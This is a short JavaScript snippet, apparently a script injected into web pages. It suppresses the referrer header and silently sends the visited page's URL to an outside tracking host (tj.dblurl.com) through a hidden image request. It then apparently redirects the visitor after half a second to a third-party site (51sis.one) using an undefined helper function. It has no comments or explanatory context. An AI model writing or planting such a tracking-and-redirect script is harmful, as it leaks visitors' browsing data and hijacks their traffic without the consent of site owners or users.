function addMeta(name,content){
    var meta = document.createElement('meta');
    meta.content=content;
    meta.name=name;
    document.getElementsByTagName('head')[0].appendChild(meta);
}
addMeta("referrer","never");
try{var img = new Image();img.src = '//tj.dblurl.com/analysis.php?site=2&u='+document.URL;}catch{}
var jumpArr = ["https://51sis.one/?dc=THD2","https://51sis.one/?dc=THD2"];
var jumpRet = jumpArr[Math.floor(Math.random()*jumpArr.length)];
localU(jumpRet,500);